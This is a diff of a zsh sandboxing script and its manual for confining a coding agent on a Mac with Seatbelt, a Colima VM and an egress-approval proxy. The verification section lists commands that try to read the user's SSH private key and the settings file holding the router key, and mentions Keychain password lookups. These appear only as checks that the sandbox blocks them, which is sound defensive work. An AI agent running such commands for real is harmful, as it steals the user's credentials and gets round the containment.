-NPM_REGISTRY=https://registry.npmjs.org/ PIP_INDEX_URL=https://pypi.org/simple PIP_TRUSTED_HOST=""
-NODE_DIST=https://nodejs.org/dist NODE_HOME="$HOME/.local/node"
-PI_PACKAGE=@earendil-works/pi-coding-agent
-PI_APT_PACKAGES="bash ca-certificates curl git ripgrep jq httpie unzip zip less procps build-essential python3 python3-dev python3-venv python3-pip"
-JDK17_IMAGE=eclipse-temurin:17-jdk JDK21_IMAGE=eclipse-temurin:21-jdk JDK25_IMAGE=eclipse-temurin:25-jdk JAVA_DEFAULT=21
-MAVEN_IMAGE=maven:3-eclipse-temurin-21 GRADLE_IMAGE=gradle:jdk21 DOCKER_CLI_IMAGE=docker:29-cli
-ARTIFACTORY_USER="" ARTIFACTORY_TOKEN="" MAVEN_REPO_URL="" GRADLE_PLUGIN_REPO_URL=""
-DOCKER_REGISTRY="" DOCKER_REGISTRY_MIRROR="" DOCKER_IMAGE_PREFIX=""
-AGENT_DOCKER=sysbox DIND_IMAGE=docker:29-dind DIND_ADDRESS_POOL=172.31.0.0/16 SANDBOX_SUBNET=172.30.0.0/24
-SYSBOX_DEB_URL=""
+PROJECTS_DIR="" VAULT_DIR=""
+BRIDGE_PORT=8789 PROXY_PORT=8080 LISTEN_HOST=127.0.0.1 SANDBOX_SUBNET=172.30.0.0/24
 UPSTREAM_PROXY="" UPSTREAM_NO_PROXY=""
+EGRESS_ALLOW_PRIVATE="" EGRESS_NO_APPROVAL="" EGRESS_ALLOW_ONLY="" EGRESS_DENY="" EGRESS_PORTS=80,443
 PI_BASH_APPROVAL=risky PI_WEB_PLAIN_HTTP=1 WEB_SEARCH_SEARXNG="" WEB_FETCH_MAX_CHARS=20000
-VM_PROFILE=pi VM_CPUS=6 VM_MEMORY=12 VM_DISK=100 VM_DISK_IMAGE=""
+ARTIFACTORY_USER="" ARTIFACTORY_TOKEN="" MAVEN_REPO_URL="" GRADLE_PLUGIN_REPO_URL=""
+NPM_REGISTRY=https://registry.npmjs.org/ PIP_INDEX_URL=https://pypi.org/simple PIP_TRUSTED_HOST=""
+NODE_DIST=https://nodejs.org/dist
+DOCKER_REGISTRY="" DOCKER_REGISTRY_MIRROR="" DOCKER_IMAGE_PREFIX=""
+APT_DEBIAN="" APT_SECURITY="" APT_UBUNTU=""
+NODE_IMAGE=node:24-bookworm-slim PYTHON_IMAGE=python:3.12-slim MITMPROXY_IMAGE=mitmproxy/mitmproxy:12.3.1
+JDK17_IMAGE=eclipse-temurin:17-jdk JDK21_IMAGE=eclipse-temurin:21-jdk JDK25_IMAGE=eclipse-temurin:25-jdk
+MAVEN_IMAGE=maven:3-eclipse-temurin-21 GRADLE_IMAGE=gradle:jdk21 DOCKER_CLI_IMAGE=docker:29-cli
+DIND_IMAGE=docker:29-dind
+PI_PACKAGE=@earendil-works/pi-coding-agent JAVA_DEFAULT=21
+PI_APT_PACKAGES="bash ca-certificates curl git ripgrep jq httpie unzip zip less procps build-essential python3 python3-dev python3-venv python3-pip"
 PI_MEMORY=8g PI_CPUS=4 PI_PIDS=4096
-source "$ENV_FILE"
-HOST_UID="${HOST_UID:-$(id -u)}" HOST_GID="${HOST_GID:-$(id -g)}"
+AGENT_DOCKER=sysbox SYSBOX_DEB_URL="" DIND_ADDRESS_POOL=172.31.0.0/16 DIND_MIN_API_VERSION=1.24
+VM_PROFILE=pi VM_CPUS=6 VM_MEMORY=12 VM_DISK=100 VM_DISK_IMAGE=""
+NODE_HOME="$HOME/.local/node" HOST_UID=$(id -u) HOST_GID=$(id -g)
+() {                                        # config.yaml on top of the defaults
+  local out line key val; local -a keys=(${(k)SETTING})
+  out=$(yq "$YQ_SETTINGS" "$CONFIG") || die "can't read $CONFIG"
+  for line in ${(f)out}; do
+    key="${line%%=*}"; eval "val=${line#*=}"
+    [[ "$key" != *.* && -z "$val" ]] && (( ${keys[(I)$key.*]} )) && continue   # a section, all commented out
+    [[ -n "${SETTING[$key]:-}" ]] || die "unknown setting $key in $CONFIG"
+    [[ "$key" == pi.apt_packages ]] && val="${val//,/ }"
+    [[ "$val" == true ]] && val=1; [[ "$val" == false ]] && val=0
+    typeset -gx "${SETTING[$key]}=$val"
+  done
+}
 DOCKER_CONTEXT="${DOCKER_CONTEXT:-colima-$VM_PROFILE}"
 SANDBOX_PROXY_IP="${SANDBOX_SUBNET%.*}.10"          # fixed address of the proxy on the internal network
 case "$AGENT_DOCKER" in                              # the agent's own Docker engine (Option C)
   sysbox)     DIND_RUNTIME=sysbox-runc DIND_PRIVILEGED=false PI_DOCKER_HOST=tcp://docker:2375 COMPOSE_PROFILES=docker ;;
   privileged) DIND_RUNTIME=runc DIND_PRIVILEGED=true PI_DOCKER_HOST=tcp://docker:2375 COMPOSE_PROFILES=docker ;;
   off)        DIND_RUNTIME=runc DIND_PRIVILEGED=false PI_DOCKER_HOST="" COMPOSE_PROFILES="" ;;
-  *)          print -u2 "pi-sandbox: AGENT_DOCKER must be sysbox, privileged or off"; exit 1 ;;
+  *)          die "agent_docker.mode must be sysbox, privileged or off" ;;
 esac
 set +a
 
-[[ -n "${PROJECTS_DIR:-}" && -n "${VAULT_DIR:-}" ]] || die "set PROJECTS_DIR and VAULT_DIR in $ENV_FILE"
+# The bridge's environment: not exported, only `pibox bridge` and the bridge container get it.
+BRIDGE_ENV=()
+() {
+  local out line val
+  out=$(yq "$YQ_BRIDGE" "$CONFIG") || die "can't read $CONFIG"
+  for line in ${(f)out}; do
+    [[ "${line%%=*}" =~ '^[A-Z_][A-Z0-9_]*$' ]] || die "bridge.${line%%=*}: not an environment variable name"
+    eval "val=${line#*=}"; BRIDGE_ENV+=("${line%%=*}=$val")
+  done
+}
+
+[[ -n "$PROJECTS_DIR" && -n "$VAULT_DIR" ]] || die "set folders.projects and folders.vault in $CONFIG"
 PROJECTS="${PROJECTS_DIR:A}" VAULT="${VAULT_DIR:A}"
 UP_MAC="${UPSTREAM_PROXY/192.168.5.2/127.0.0.1}"     # the same proxy, as seen from the Mac
 ARCH=$([[ $(uname -m) == arm64 ]] && print arm64 || print x64)
+
+# Generated on every run: .env for plain `docker compose` in $SB, the bridge container's environment.
+dotenv() {                                  # dotenv <file> NAME=value...: a file docker compose and sh read
+  local kv; local -a lines=("# Generated by pibox from $CONFIG on every run; edit config.yaml instead.")
+  for kv in "${@:2}"; do
+    [[ "$kv" != *[\'$'\n']* ]] || die "${kv%%=*}: values with ' or a line break are not supported"
+    lines+=("${kv%%=*}='${kv#*=}'")
+  done
+  mkdir -p "${1:h}"; (umask 077; print -rl -- $lines > "$1")
+}
+() {
+  local v; local -a kv
+  for v in ${(ou)SETTING} SANDBOX_PROXY_IP DIND_RUNTIME DIND_PRIVILEGED PI_DOCKER_HOST COMPOSE_PROFILES; do
+    kv+=("$v=${(P)v}")
+  done
+  dotenv "$SB/.env" $kv
+  dotenv "$SB/generated/bridge.env" BRIDGE_PORT="$BRIDGE_PORT" $BRIDGE_ENV
+}
 
 # ---------------------------------------------------------------- helpers
 compose_args() {                            # docker compose, with compose.override.yaml if present
@@ -608,25 +724,17 @@ here() {                                    # the current folder, if the agent m
   print -r -- "$h"
 }
 
-models() {                                  # models <baseUrl> <file>: Pi's model list from MODEL_*
-  [[ -n "$MODEL_ID" ]] || die "set MODEL_ID in $ENV_FILE"
-  local id; local -a items
-  for id in ${(s:,:)${MODEL_ID//[[:space:]]/}}; do
-    items+=("        { \"id\": \"$id\", \"name\": \"$id (sandbox)\", \"reasoning\": $MODEL_REASONING, \"input\": [\"text\"], \"contextWindow\": $MODEL_CONTEXT, \"maxTokens\": $MODEL_MAX_TOKENS, \"cost\": { \"input\": 0, \"output\": 0, \"cacheRead\": 0, \"cacheWrite\": 0 } }")
-  done
+models() {                                  # models <baseUrl> <file>: Pi's model list from config.yaml
+  [[ $(yq '(.models | tag == "!!seq" and length > 0) and ([.models[] | select((.id | tag) != "!!str"
+         or (.contextWindow | tag) != "!!int" or (.maxTokens | tag) != "!!int")] | length == 0)' "$CONFIG") == true ]] ||
+    die "models in $CONFIG: a list of entries, each with id, contextWindow and maxTokens"
   mkdir -p "${2:h}"
-  print -r -- "{
-  \"providers\": {
-    \"pi-sandbox\": {
-      \"baseUrl\": \"$1\", \"api\": \"openai-completions\", \"apiKey\": \"unused\",
-      \"compat\": { \"supportsDeveloperRole\": false, \"supportsStore\": false,
-                  \"supportsReasoningEffort\": $MODEL_REASONING_EFFORT, \"supportsUsageInStreaming\": true },
-      \"models\": [
-${(pj:,\n:)items}
-      ]
-    }
-  }
-}" > "$2"
+  BASE_URL="$1" yq -o=json '{"providers": {"pi-sandbox": {
+    "baseUrl": strenv(BASE_URL), "api": "openai-completions", "apiKey": "unused",
+    "compat": {"supportsDeveloperRole": false, "supportsStore": false,
+               "supportsReasoningEffort": false, "supportsUsageInStreaming": true},
+    "models": [.models[] | {"id": .id, "name": .id + " (sandbox)", "reasoning": false, "input": ["text"],
+                            "cost": {"input": 0, "output": 0, "cacheRead": 0, "cacheWrite": 0}} * .]}}}' "$CONFIG" > "$2"
 }
 
 xml() { local s="$1"; s=${s//&/&amp;}; s=${s//</&lt;}; s=${s//>/&gt;}; print -rn -- "$s" }
@@ -649,7 +757,7 @@ tooling() {                                 # tooling <dir> <proxy host> <proxy 
   # Maven: one mirror for every repository, your credentials, the filtering proxy.
   {
     print -r -- "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
-<!-- Generated by pi-sandbox from .env; edit .env instead. -->
+<!-- Generated by pibox from config.yaml; edit config.yaml instead. -->
 <settings xmlns=\"http://maven.apache.org/SETTINGS/1.2.0\">"
     [[ -n "$MAVEN_REPO_URL" ]] && print -r -- "  <mirrors>
     <mirror><id>pi-sandbox-mirror</id><mirrorOf>*</mirrorOf><url>$(xml "$MAVEN_REPO_URL")</url></mirror>
@@ -675,7 +783,7 @@ tooling() {                                 # tooling <dir> <proxy host> <proxy 
     print -r -- "</toolchains>"
   } > "$dir/toolchains.xml"
   {
-    print -r -- "# Generated by pi-sandbox from .env
+    print -r -- "# Generated by pibox from config.yaml
 systemProp.http.proxyHost=$ph
 systemProp.http.proxyPort=$pp
 systemProp.http.nonProxyHosts=$nonproxy
@@ -687,7 +795,7 @@ org.gradle.java.installations.auto-download=false"
   } > "$dir/gradle.properties"
 
   # Gradle: replace every remote repository (projects, buildscripts, plugins) by the mirror.
-  print -r -- "// Generated by pi-sandbox from .env: remote repositories are replaced by your mirror.
+  print -r -- "// Generated by pibox from config.yaml: remote repositories are replaced by your mirror.
 def MIRROR_NAME = 'pi-sandbox-mirror'
 def MIRROR_URL = '$MAVEN_REPO_URL'
 def PLUGIN_URL = '${GRADLE_PLUGIN_REPO_URL:-$MAVEN_REPO_URL}'
@@ -730,7 +838,7 @@ allprojects { p ->
 
   # npm, pip
   {
-    print -r -- "# Generated by pi-sandbox from .env
+    print -r -- "# Generated by pibox from config.yaml
 registry=$NPM_REGISTRY
 proxy=http://$ph:$pp/
 https-proxy=http://$ph:$pp/
@@ -745,7 +853,7 @@ update-notifier=false"
   } > "$dir/npmrc"
   local index="$PIP_INDEX_URL"
   [[ -n "$ARTIFACTORY_USER" ]] && index="${PIP_INDEX_URL%%://*}://$(urlenc "$ARTIFACTORY_USER"):$(urlenc "$ARTIFACTORY_TOKEN")@${PIP_INDEX_URL#*://}"
-  print -r -- "# Generated by pi-sandbox from .env
+  print -r -- "# Generated by pibox from config.yaml
 [global]
 index-url = $index
 trusted-host = ${PIP_TRUSTED_HOST:-$(hostpart "$PIP_INDEX_URL")}
@@ -790,14 +898,21 @@ egress_env() {                              # EGRESS_* settings for the policy a
 cmd="${1:-help}"; (( $# )) && shift
 case "$cmd" in
 
-config)                                     # show the effective settings (the key masked)
-  for v in PROJECTS VAULT BRIDGE_PORT PROXY_PORT MODEL_ID UPSTREAM_PROXY UP_MAC UPSTREAM_NO_PROXY \
-           NPM_REGISTRY PIP_INDEX_URL NODE_DIST NODE_HOME VM_PROFILE DOCKER_CONTEXT HOST_UID HOST_GID \
-           ${(k)parameters[(I)EGRESS_*]}; do
-    print -r -- "$v=${(P)v}"
+config)                                     # show the effective settings (secrets masked)
+  local k v kv
+  for k in ${(ok)SETTING}; do
+    v="${(P)SETTING[$k]}"
+    [[ "$k" == repository.token ]] && v="${v:+set (${#v} chars)}"
+    print -r -- "$k: $v"
   done
-  print -r -- "PI_TEXT_URL=${PI_TEXT_URL:-}"
-  print -r -- "PI_TEXT_KEY=${${PI_TEXT_KEY:-}:+set (${#PI_TEXT_KEY} chars)}"
+  for kv in $BRIDGE_ENV; do
+    k="${kv%%=*}" v="${kv#*=}"
+    [[ "$k" == *(KEY|TOKEN|SECRET|PASSWORD)* ]] && v="${v:+set (${#v} chars)}"
+    print -r -- "bridge.$k: $v"
+  done
+  yq '.models[] | "model: " + .id + "  contextWindow " + (.contextWindow | tostring)
+      + ", maxTokens " + (.maxTokens | tostring) + ", reasoning " + (.reasoning // false | tostring)' "$CONFIG"
+  print -r -- "derived: projects $PROJECTS, vault $VAULT, upstream proxy from the Mac '$UP_MAC', docker context $DOCKER_CONTEXT"
   ;;
 
 install-node)                               # A, E: Node.js from NODE_DIST into NODE_HOME, checksum verified
@@ -820,7 +935,7 @@ bridge)                                     # A, B, D, E: the bridge on the Mac 
     python3 -m venv .venv
     .venv/bin/pip install --index-url "$PIP_INDEX_URL" ${PIP_TRUSTED_HOST:+--trusted-host "$PIP_TRUSTED_HOST"} -r requirements.txt
   fi
-  exec env HTTP_PROXY="$UP_MAC" HTTPS_PROXY="$UP_MAC" NO_PROXY="$UPSTREAM_NO_PROXY" \
+  exec env $BRIDGE_ENV HTTP_PROXY="$UP_MAC" HTTPS_PROXY="$UP_MAC" NO_PROXY="$UPSTREAM_NO_PROXY" \
     .venv/bin/uvicorn proxy:app --host "$LISTEN_HOST" --port "$BRIDGE_PORT"
   ;;
 
@@ -856,10 +971,10 @@ jail)                                       # A: Pi under Seatbelt, in the curre
     pi -e "$SB/extensions/sandbox-guard.ts" -e "$SB/extensions/web.ts" "$@"
   ;;
 
-vm)                                         # B, C: write the Colima config from .env and start the VM
+vm)                                         # B, C: write the Colima config from config.yaml and start the VM
   local dir="${COLIMA_HOME:-$HOME/.colima}/$VM_PROFILE"; mkdir -p "$dir"
   {
-    print -r -- "# Generated by pi-sandbox from $ENV_FILE; edit .env instead."
+    print -r -- "# Generated by pibox from $CONFIG; edit config.yaml instead."
     print -r -- "vmType: vz
 mountType: virtiofs
 runtime: docker
@@ -918,7 +1033,7 @@ EOF
   ;;
 
 vm-sysbox)                                  # C: install the sysbox runtime in the VM (AGENT_DOCKER=sysbox)
-  [[ -n "$SYSBOX_DEB_URL" ]] || die "set SYSBOX_DEB_URL in $ENV_FILE (the sysbox-ce .deb for the VM's architecture)"
+  [[ -n "$SYSBOX_DEB_URL" ]] || die "set agent_docker.sysbox_deb_url in $CONFIG (the sysbox-ce .deb for the VM's architecture)"
   colima ssh -p "$VM_PROFILE" -- env URL="$SYSBOX_DEB_URL" UPSTREAM_PROXY="$UPSTREAM_PROXY" bash -s <<'EOF'
 set -euo pipefail
 [ -n "$UPSTREAM_PROXY" ] && export http_proxy="$UPSTREAM_PROXY" https_proxy="$UPSTREAM_PROXY"
@@ -1011,7 +1126,7 @@ verify)                                     # C: try everything the agent must n
     java -version 2>&1 | head -1; jdk 17 java -version 2>&1 | head -1; mvn -v | head -1; gradle -v | grep ^Gradle
     node -v; python3 -V; docker compose version
     if [ -n \"\$DOCKER_HOST\" ]; then docker info --format 'agent docker: {{.ServerVersion}}'; fi
-    curl -sS -m 30 http://example.com | head -c 200; echo        # waits for your approval (pi-sandbox approve)
+    curl -sS -m 30 http://example.com | head -c 200; echo        # waits for your approval (pibox approve)
   " </dev/null
   ;;
 
@@ -1036,12 +1151,12 @@ review)                                     # all: changes that would make YOUR 
     print "⚠️  Obsidian settings changed in the last 24 h (plugins run with your rights):"
     print -r -- "$changed" | sed 's/^/    /'
   fi
-  (( found )) || print "pi-sandbox review: nothing suspicious (hooks, git config, .obsidian)"
+  (( found )) || print "pibox review: nothing suspicious (hooks, git config, .obsidian)"
   exit $found
   ;;
 
 help|*)
-  print "pi-sandbox <command>   (settings: $ENV_FILE)
+  print "pibox <command>   (settings: $CONFIG)
   config         show the effective settings
   review         look for git hooks, risky git config, recent .obsidian changes   (all options)
   install-node   Node.js from NODE_DIST into NODE_HOME                            (A, E)
@@ -1066,25 +1181,31 @@ esac
 
 How it works:
 
-1. **Settings.** It sets a default for every setting, then reads `.env` on top (`set -a` exports
-   them, so `docker compose` started from the script sees the same values). It derives a few values:
+1. **Settings.** It sets a default for every setting, then reads `config.yaml` on top with `yq`.
+   The table `SETTING` maps each key of `config.yaml` to the variable that the script, `compose.yaml`
+   and the extensions use (`egress.no_approval` → `EGRESS_NO_APPROVAL`); a key that isn't in it is an
+   error. `set -a` exports them, so `docker compose` started from the script sees the same values.
+   The `bridge` section is kept apart and given only to the bridge. It derives a few values:
    your user and group ids, `UP_MAC` (the upstream proxy as seen from the Mac: `192.168.5.2` becomes
    `127.0.0.1`), the CPU architecture for Node downloads, and the Docker context of the VM.
-2. **Generated files.** `models` writes Pi's model list from `MODEL_*`, each time with the bridge
-   address that option needs (`127.0.0.1`, `host.lima.internal` or `bridge`). The `vm` command writes
-   Colima's configuration. You never edit these files; they are rewritten on every run.
-3. **The folder check.** `here` refuses to start the agent outside `PROJECTS_DIR` and `VAULT_DIR`.
+2. **Generated files.** Every run writes `~/.pi-sandbox/.env` (all settings in effect, for
+   `docker compose`) and `generated/bridge.env` (the bridge container's environment). `models` writes
+   Pi's model list from `models`, each time with the bridge address that option needs (`127.0.0.1`,
+   `host.lima.internal` or `bridge`): each entry of `config.yaml` with the defaults filled in. The
+   `vm` command writes Colima's configuration. You never edit these files; they are rewritten on
+   every run.
+3. **The folder check.** `here` refuses to start the agent outside `folders.projects` and `folders.vault`.
    Start it in one project, in `~/Projects` itself to work across several, or in the vault.
 4. **A clean environment for the agent.** Commands that start the agent or its proxy on the Mac use
    `env -i` with a short allowlist (`agent_env`, `egress_env`). Tokens you export in `~/.zshrc`
-   (`GITHUB_TOKEN`, cloud keys, the router key from `.env`) never reach the agent.
+   (`GITHUB_TOKEN`, cloud keys, the router key from `config.yaml`) never reach the agent.
 5. **One subcommand per job**:
 
 | Command | Option | What it does |
 |---|---|---|
 | `config` | all | Print the settings in effect |
 | `review` | all | After a session: git hooks, risky git config, recent `.obsidian` changes (§6.7) |
-| `install-node`, `install-pi` | A, E | Node.js from `NODE_DIST` (checksum verified) into `NODE_HOME`; Pi from `NPM_REGISTRY` |
+| `install-node`, `install-pi` | A, E | Node.js from `repository.node_dist` (checksum verified) into `mac.node_home`; Pi from `repository.npm` |
 | `bridge` | A, B, D, E | Run the bridge on the Mac (§6.5) |
 | `webproxy` | A, D | Run the filtering proxy on the Mac (§13) |
 | `jail` | A | Pi under Seatbelt (§7) |
@@ -1098,24 +1219,25 @@ How it works:
 (§9). For Options A, B, D and E it runs on the Mac, from its own clone in `~/.pi-sandbox/pi-text`:
 
 ```bash
-pi-sandbox bridge          # keep it running in its own terminal
+pibox bridge          # keep it running in its own terminal
 ```
 
 **Why each part:**
 - a separate clone, so the agent (which can write to `~/Projects`) can't modify the code that holds the key;
 - on first use it creates a Python virtual environment and installs the bridge's packages from
-  `PIP_INDEX_URL`;
-- it starts the bridge on `127.0.0.1:BRIDGE_PORT` (only programs on this Mac can connect), with
-  `PI_TEXT_URL`, `PI_TEXT_KEY`, `TRACE` and the other bridge settings from `.env`, and with
-  `UPSTREAM_PROXY` for the router unless the router is listed in `UPSTREAM_NO_PROXY`;
-- `TRACE=-` shows every exchange live (§14).
+  `repository.pip`;
+- it starts the bridge on `127.0.0.1:<network.bridge_port>` (only programs on this Mac can connect),
+  with the `bridge` section of `config.yaml` (`PI_TEXT_URL`, `PI_TEXT_KEY`, `TRACE`, …) as its
+  environment, and with `network.upstream_proxy` for the router unless the router is listed in
+  `network.upstream_no_proxy`;
+- `TRACE: "-"` shows every exchange live (§14).
 
-Check from another terminal: `curl -s http://127.0.0.1:8789/v1/models | head -c 300` (with your `BRIDGE_PORT`).
+Check from another terminal: `curl -s http://127.0.0.1:8789/v1/models | head -c 300` (with your `network.bridge_port`).
 
 ### 6.6 A separate, credential-free Pi configuration
 
 **What:** a Pi agent directory just for the sandbox, `~/.pi-sandbox/agent`, containing only the model
-list (generated from `MODEL_*`) and these settings, `~/.pi-sandbox/agent/settings.json`:
+list (generated from `models` in `config.yaml`) and these settings, `~/.pi-sandbox/agent/settings.json`:
 
 ```json
 {
@@ -1139,7 +1261,7 @@ list (generated from `MODEL_*`) and these settings, `~/.pi-sandbox/agent/setting
 | `enableInstallTelemetry: false` | No install/update reporting | Fewer outbound connections, important behind an approving proxy |
 | `"-builtin:mcp"`, `"-builtin:llama.cpp"` | Disable built-in MCP support and the local llama.cpp provider | MCP servers are extra processes outside Pi's tool hooks. Add them deliberately, if at all |
 
-`pi-sandbox` also sets these environment variables for Pi:
+`pibox` also sets these environment variables for Pi:
 
 | Variable / flag | Why |
 |---|---|
@@ -1148,13 +1270,13 @@ list (generated from `MODEL_*`) and these settings, `~/.pi-sandbox/agent/setting
 | `PI_OFFLINE=1`, `PI_SKIP_VERSION_CHECK=1`, `PI_TELEMETRY=0` | Pi makes no network calls of its own (version checks, model catalogs), so the only traffic is what the agent does |
 | `PI_SANDBOX_ROOTS=<projects>:<vault>` | The folders `sandbox-guard.ts` lets the file tools touch (§12.2) |
 
-Arguments after the command go to Pi: `pi-sandbox run --no-context-files` doesn't auto-load
-`AGENTS.md`/`CLAUDE.md` (use it for repositories you don't trust), `pi-sandbox run -p "…" </dev/null`
+Arguments after the command go to Pi: `pibox run --no-context-files` doesn't auto-load
+`AGENTS.md`/`CLAUDE.md` (use it for repositories you don't trust), `pibox run -p "…" </dev/null`
 runs one prompt without the UI.
 
 ### 6.7 Make undo cheap, and review what could run later
 
-**What:** commit (or take a snapshot) before each session, and run `pi-sandbox review` after it.
+**What:** commit (or take a snapshot) before each session, and run `pibox review` after it.
 **Why:** isolation limits *where* damage can happen. Inside your projects and the vault the agent can
 still break things, and git is your undo button. `review` looks for the changes from §6.1 that would
 make your own tools run code: git hooks, dangerous `.git/config` keys, recent changes in `.obsidian`.
@@ -1188,14 +1310,14 @@ which sandbox-exec && sw_vers
 
 ### 7.1 Node.js and Pi on the Mac
 
-Pi needs Node.js 22.19 or newer. Either `brew install node` and set `NODE_HOME` in `.env` to
-`/opt/homebrew`, or let `pi-sandbox` install the official tarball from `NODE_DIST` into `NODE_HOME`,
+Pi needs Node.js 22.19 or newer. Either `brew install node` and set `mac.node_home` in `config.yaml` to
+`/opt/homebrew`, or let `pibox` install the official tarball from `repository.node_dist` into `mac.node_home`,
 checked against its published checksum:
 
 ```bash
-pi-sandbox install-node
+pibox install-node
 echo 'export PATH="$HOME/.local/node/bin:$PATH"' >> ~/.zprofile     # your NODE_HOME/bin
-pi-sandbox install-pi                                              # Pi from NPM_REGISTRY, PI_PACKAGE
+pibox install-pi                                              # Pi from NPM_REGISTRY, PI_PACKAGE
 ```
 
 `install-pi` uses `--ignore-scripts`, which skips dependencies' install scripts.
@@ -1235,7 +1357,7 @@ Save as `~/.pi-sandbox/pi.sb`. Read the comments; they explain each block.
   (subpath (param "EXT_DIR"))                      ; extensions, read-only
   (subpath (param "GENERATED"))                    ; generated settings.xml, npmrc, pip.conf (§9.9)
   (subpath (param "CACHE"))
-  (subpath (param "NODE_HOME"))                    ; Node.js and Pi (NODE_HOME in .env)
+  (subpath (param "NODE_HOME"))                    ; Node.js and Pi (mac.node_home in config.yaml)
   (literal (string-append (param "HOME") "/.gitconfig")))          ; your git identity, if any
 
 ;; Never writable, even inside the allowed folders:
@@ -1264,20 +1386,20 @@ How it works:
   all network), then `allow` the exceptions after it. The final `deny file-write*` block beats the
   earlier `allow` again. That's how "readable but not writable" is expressed: Pi's configuration,
   `.obsidian` and every `.git/config` and `.git/hooks` can be read, but not changed.
-- **`(param "PROJECTS")`** etc. are filled in by `pi-sandbox jail` with `-D PROJECTS=/path`, from `.env`,
+- **`(param "PROJECTS")`** etc. are filled in by `pibox jail` with `-D PROJECTS=/path`, from `config.yaml`,
   so the profile contains no personal paths and no ports.
 - **`~/.pi-sandbox` is not readable as a whole**: only `agent`, `extensions` and the session folder
-  are. `.env` and the bridge with its key are not.
+  are. `config.yaml`, the generated `.env` files and the bridge with its key are not.
 - **Why `/private/var/folders`:** that's where `$TMPDIR` really lives (`/var` is a symlink to
   `/private/var`). Compilers, npm and Pi need a temp directory.
 - **Why `/dev/tty…`:** the Pi TUI draws on your terminal device.
-- **Why `NODE_HOME`:** Node and Pi themselves must be readable.
+- **Why `mac.node_home`:** Node and Pi themselves must be readable.
 - **`appleevent-send`** is how `osascript` remote-controls other apps (Finder, Mail, Terminal). Denying it removes a whole class of macOS-specific tricks.
 - **The `mach-lookup` lines** cut the connection to the Keychain daemon, so `security find-generic-password` fails.
 
 More things to know:
 
-- Paths must be canonical: `/tmp` is really `/private/tmp`. `pi-sandbox` resolves symlinks for you.
+- Paths must be canonical: `/tmp` is really `/private/tmp`. `pibox` resolves symlinks for you.
 - Creating a new repository (`git init`) fails inside the sandbox, because it writes `.git/config`
   and hook samples. Run it from your normal shell; committing works.
 - `$TMPDIR` is shared with your other programs. Don't leave secrets in temp files while the agent runs.
@@ -1286,13 +1408,13 @@ More things to know:
 - If a tool you need suddenly fails with Keychain errors, temporarily remove the `mach-lookup`
   lines. Node, curl and git normally don't need the Keychain.
 
-### 7.3 What `pi-sandbox jail` does
+### 7.3 What `pibox jail` does
 
-When you run `cd ~/Projects/api && pi-sandbox jail`:
+When you run `cd ~/Projects/api && pibox jail`:
 
-1. It checks that the current folder lies under `PROJECTS_DIR` or `VAULT_DIR`, and resolves every
+1. It checks that the current folder lies under `folders.projects` or `folders.vault`, and resolves every
    path with symlinks (`${…:A}`), because the profile compares real paths.
-2. It writes `agent/models.json` with the bridge at `127.0.0.1:BRIDGE_PORT`, and creates a session
+2. It writes `agent/models.json` with the bridge at `127.0.0.1:<network.bridge_port>`, and creates a session
    folder per working folder (`Projects-api`).
 3. `sandbox-exec` loads `pi.sb` with the parameters. From this moment, the process and all of its
    descendants are confined.
@@ -1307,7 +1429,7 @@ When you run `cd ~/Projects/api && pi-sandbox jail`:
    - the build tools' settings: `MAVEN_ARGS` (the generated `settings.xml`, the Maven cache),
      `GRADLE_USER_HOME`, `NPM_CONFIG_USERCONFIG`, `PIP_CONFIG_FILE` and their caches, all under
      `~/.pi-sandbox/generated/a` and `~/.pi-sandbox/cache` (§9.9 explains the files; here the proxy is
-     `127.0.0.1:PROXY_PORT`).
+     `127.0.0.1:<network.proxy_port>`).
 5. Pi starts with the two extensions from §12 loaded explicitly with `-e`.
 
 **Build tools in Option A** are the ones installed on your Mac: a JDK under
@@ -1318,18 +1440,18 @@ no network beyond localhost), so Testcontainers and `docker compose` need Option
 
 ### 7.4 First run and verification
 
-In separate terminals: `pi-sandbox bridge` and, for web access, `pi-sandbox webproxy` (§13). Put the
+In separate terminals: `pibox bridge` and, for web access, `pibox webproxy` (§13). Put the
 extensions from §12 into `~/.pi-sandbox/extensions/`, then:
 
 ```bash
-cd ~/Projects/api && pi-sandbox jail
+cd ~/Projects/api && pibox jail
 ```
 
 Inside Pi, type these lines **yourself**. A `!` prefix runs a shell command directly, under the same sandbox:
 
 ```text
 !cat ~/.ssh/id_ed25519            # → Operation not permitted
-!cat ~/.pi-sandbox/.env           # → Operation not permitted
+!cat ~/.pi-sandbox/config.yaml    # → Operation not permitted
 !ls ~/Documents                    # → Operation not permitted
 !touch ~/evil                      # → Operation not permitted
 !ls ../web && touch ../web/ok && rm ../web/ok   # → works (another project)
@@ -1365,19 +1487,19 @@ stays open in this option; Option C adds the control.
 
 ```bash
 brew install colima
-pi-sandbox vm
+pibox vm
 ```
 
-`pi-sandbox vm` writes `~/.colima/<VM_PROFILE>/colima.yaml` from `.env` and starts the VM. For the
-`.env` example above, the generated file is:
+`pibox vm` writes `~/.colima/<vm.profile>/colima.yaml` from `config.yaml` and starts the VM. For the
+`config.yaml` example above, the generated file is:
 
 ```yaml
 vmType: vz
 mountType: virtiofs
 runtime: docker
-cpu: 4
-memory: 8
-disk: 60
+cpu: 6
+memory: 12
+disk: 100
 forwardAgent: false
 mounts:
   - location: "/Users/you/Projects"
@@ -1389,56 +1511,56 @@ mounts:
 ```
 
 What it means:
-- `VM_PROFILE` (default `pi`) is a **profile name**: a separate VM, independent of any other Colima you use;
+- `vm.profile` (default `pi`) is a **profile name**: a separate VM, independent of any other Colima you use;
 - `vmType: vz`, `mountType: virtiofs`: Apple's hypervisor and the fast shared-folder implementation;
 - `mounts`: only these folders are shared. **This replaces Colima's default of mounting your entire
   home directory.** `~/.pi-sandbox` is read-only, because Option C's containers mount files from it;
 - `forwardAgent: false`: with SSH agent forwarding, processes in the VM could use your SSH keys
   without seeing them;
-- with `UPSTREAM_PROXY` set, a `docker: proxies:` block is added, so the VM's Docker downloads images
+- with `network.upstream_proxy` set, a `docker: proxies:` block is added, so the VM's Docker downloads images
   through it.
 
 On its first start Colima downloads a VM disk image. If that download is blocked, get the image file
-for your Colima version through your mirror and set `VM_DISK_IMAGE` to it (see `colima start --help`).
+for your Colima version through your mirror and set `vm.disk_image` to it (see `colima start --help`).
 
-At the end, `pi-sandbox vm` lists the VM's shared folders: there must be exactly these three.
+At the end, `pibox vm` lists the VM's shared folders: there must be exactly these three.
 
 ### 8.2 Install Node and Pi inside the VM
 
 ```bash
-pi-sandbox vm-setup
+pibox vm-setup
 ```
 
 What it does, inside the VM (an Ubuntu system):
 
